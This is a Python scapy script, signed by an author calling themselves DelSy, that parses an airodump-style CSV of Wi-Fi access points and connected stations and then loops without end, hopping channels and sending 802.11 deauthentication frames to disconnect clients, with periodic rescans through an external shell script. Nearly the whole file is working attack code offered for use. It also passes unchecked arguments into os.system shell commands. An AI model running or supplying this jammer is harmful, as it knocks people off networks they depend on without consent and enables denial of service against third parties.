#library
import os
import argparse
import csv
from scapy.all import *
from rich.table import Table
from rich.console import Console

#arg 

parser = argparse.ArgumentParser()
parser.add_argument('-s','--scannum',help="after how many round , scan should be done?")
parser.add_argument('-t','--timeout',help="time out for scan ")
parser.add_argument('-d','--deauthnum',help="number of deauth packet")
parser.add_argument('-sc','--starterchannel',help="starter channel to scan")
parser.add_argument('-ec','--endchannel',help="last channel to scan")
parser.add_argument('-a','--address',help="your csv file address(v2)(important)")
parser.add_argument('-NC','--Networkcard',help="your network card's name(important)",required=True)
parser.add_argument('-c','--channel',help="Channel")

#first variables



args = parser.parse_args()
channel = None
num = 50
timeout1 = 5
deauth_num = 1
sc = 1
ec1 = 11
NC=args.Networkcard


if args.channel:
    channel = args.channel


if args.address:#for check existance of csv file address
    addres_csv = args.address 
    ads = addres_csv.split('/')
    name_s = ads[-1].split("-")
    oname = name_s[0]
else:
    addres_csv = input("please enter your csv file address :  ")  
    ads = addres_csv.split('/')
    name_s = ads[-1].split("-")
    oname = name_s[0]

if args.timeout:
    timeout1 = int(args.timeout)
if args.scannum:
    num = int(args.scannum)
if args.deauthnum:
    deauth_num = int(args.deauthnum)
if args.starterchannel:
    sc = int(args.starterchannel)
if args.endchannel:
    ec = int(args.endchannel)


#packet handler

ssids = set()
macs = []
def Packethandler(pkt):
    global macs
    if pkt.haslayer(Dot11Beacon):
            if (pkt.info not in ssids) and pkt.info :
                macs.append(pkt.addr3)
                
#joblist

mcm = []#v2



##script v2

#table

def tab(mcm):
    console = Console()
    table = Table(title="WiFi table")
    table.add_column("WiFi", justify="center", style="cyan", no_wrap=True)
    table.add_column("channel", justify="center", style="green", no_wrap=True)
    table.add_column("Devices", justify="center", style="white", no_wrap=True)

    for i in mcm:
        for j in i[2]:
            table.add_row(i[0],i[1],j)
    console.print(table)


#send deauth

def deauth(deauth_num,NC):
    for mac in mcm:
        os.system('clear')
        os.system("iwconfig {} channel {}".format(NC,mac[1]))
        dot11 = Dot11(type = 0, subtype = 12, addr1 = mac[2] ,addr2 = mac[0] ,addr3 = mac[0])
        pac = RadioTap()/dot11/Dot11Deauth(reason = 7)
        tab(mcm)
        print("""AP ==> {}  
chanell ==> {}  
Connected device ==> {}""".format(mac[0],mac[1],mac[2]))
        print("sending deauth ",end="")
        sendp(pac,inter = 0.1 ,count=deauth_num,iface=NC,verbose=1)
        

#extract csv file

def ec(addr,typ):
    with open(addr,'r') as  file:
        reader = csv.reader(file)
        for row in reader:
            if row == []:
                continue
            elif row[0] == 'BSSID':
                check = 1
                continue
        
            elif row[0] == 'Station MAC':
                check = 2
                continue
            else:
                if check == 1:
                    if typ == 1:
                        mcm.append([row[0],row[3],["FF:FF:FF:FF:FF:FF"]])
                    else:
                        for i in mcm:
                            if ' '+i[0] == row[0]:
                                i[1] = row[3]
                    
                else:
                    for i in mcm :
                        if ' '+i[0] == row[5]:

                            if row[0] not in i[2]:
                                i[2].append(row[0])

#main script v2

def main2(num,oname,timeout,NC,name,addr_file):
    counter = 1
    ec(addr_file,1)
    counter1 = 0
   
    
    
    while True:
        
        
        if counter == 1 :
            if channel != None:
                while counter1 < len(mcm):
                    if int(mcm[counter1][1])!= int(channel):
                        mcm.remove(mcm[counter1])
                    else:
                        counter1 += 1
        
        if counter % num == 0:
            
            if channel == None:
                os.system("./b.sh {} {} {} {}".format(oname,NC,timeout,name))
                
                
            else:
                os.system("./b.sh {} {} {} {} {}".format(oname,NC,timeout,name,channel))
                
                
            print(name)
            ec(name,2)
        
        os.system("clear")
        
        deauth(deauth_num,NC)
        counter += 1
       


#main source

main2(num,oname,timeout1,NC,ads[-1],addres_csv)

#made by : DelSy
#enjoy :)